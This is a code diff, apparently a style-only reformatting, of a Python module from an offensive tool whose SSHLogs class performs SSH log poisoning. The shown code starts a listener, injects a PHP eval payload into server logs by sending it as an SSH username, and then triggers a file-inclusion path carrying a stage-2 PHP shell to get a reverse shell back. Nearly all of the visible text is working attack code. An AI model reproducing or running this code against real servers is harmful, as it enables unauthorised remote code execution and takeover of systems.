@@ -6,10 +6,10 @@ from .utils import listener, attack, colors, cook, msf_payload
 
 from .Detection import Detection
 
-#TODO: Not working properly. Fix this
+
+# TODO: Not working properly. Fix this
 class SSHLogs:
     def __init__(self, args):
-
         self.target = args.url
         self.location = args.location
         self.relative = args.relative
@@ -38,7 +38,7 @@ class SSHLogs:
         handle = listener(lhost, lport)
         handle.handler()
 
-        with open('/tmp/{0}.php'.format(shell), 'r') as f:
+        with open("/tmp/{0}.php".format(shell), "r") as f:
             payload_stage2 = parse.quote(f.read())
 
         payload = "<?php eval(\\$_GET['code'])?>"
@@ -48,10 +48,10 @@ class SSHLogs:
         host = parse.urlsplit(self.target).netloc
         system('/usr/bin/ssh "{0}@{1}"'.format(payload, host))
 
-        print(colors("[~] Executing Shell!",93))
+        print(colors("[~] Executing Shell!", 93))
 
         """ Attempt traverse """
-        self.location = self.location + '&code={0}'.format(payload_stage2)
+        self.location = self.location + "&code={0}".format(payload_stage2)
         if self.cookies:
             f_cookies = cook(self.cookies)
             attack(self.target, self.location, cookies=f_cookies)
